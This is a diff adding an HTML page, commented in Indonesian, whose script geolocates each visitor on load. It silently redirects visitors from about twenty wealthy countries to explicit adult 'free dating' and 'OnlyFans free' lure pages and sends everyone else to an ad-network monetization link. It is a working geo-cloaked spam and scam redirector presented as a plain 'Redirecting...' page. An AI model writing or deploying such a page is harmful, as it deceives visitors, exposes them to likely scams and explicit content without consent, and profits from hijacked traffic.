@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Redirecting...</title>
+    <script>
+      // Negara target (ISO Alpha-2)
+      const targetCountries = [
+        "AU",
+        "AT",
+        "BE",
+        "CA",
+        "DK",
+        "FI",
+        "FR",
+        "DE",
+        "IT",
+        "NL",
+        "ES",
+        "SE",
+        "CH",
+        "GB",
+        "US",
+        "JP",
+        "NO",
+        "PT",
+        "NZ",
+        "TW",
+      ];
+
+      // URL untuk negara target
+      const targetUrls = [
+        "https://mhn.whtstrmx.my.id/FreeDating/",
+        "https://mhn.whtstrmx.my.id/FreeFuckbook/",
+        "https://mhn.whtstrmx.my.id/FreeVideos/",
+        "https://mhn.whtstrmx.my.id/HornyGirlPlaying-Cunt/",
+        "https://mhn.whtstrmx.my.id/LiveStream1/",
+        "https://mhn.whtstrmx.my.id/LiveStream2/",
+        "https://mhn.whtstrmx.my.id/Onlyfansfree/",
+        "https://mhn.whtstrmx.my.id/WatchHorny/",
+      ];
+
+      // URL fallback (non-target)
+      const fallbackUrls = [
+        "https://www.profitableratecpm.com/hn0e93zd?key=75687488970783f8df4342427a1ba3eb",
+        "https://www.profitableratecpm.com/hn0e93zd?key=75687488970783f8df4342427a1ba3eb",
+      ];
+
+      // Pilih URL acak
+      const randomUrl = (list) => list[Math.floor(Math.random() * list.length)];
+
+      // Redirect fallback jika geoip lambat/gagal (300ms)
+      const fallback = setTimeout(() => {
+        location.replace(randomUrl(fallbackUrls));
+      }, 5000);
+
+      // GeoIP callback
+      function geoip(r) {
+        clearTimeout(fallback);
+        const url = targetCountries.includes(r.country)
+          ? randomUrl(targetUrls)
+          : randomUrl(fallbackUrls);
+        location.replace(url);
+      }
+    </script>
+    <script src="https://get.geojs.io/v1/ip/country.js?callback=geoip"></script>
+  </head>
+  <body></body>
+</html>
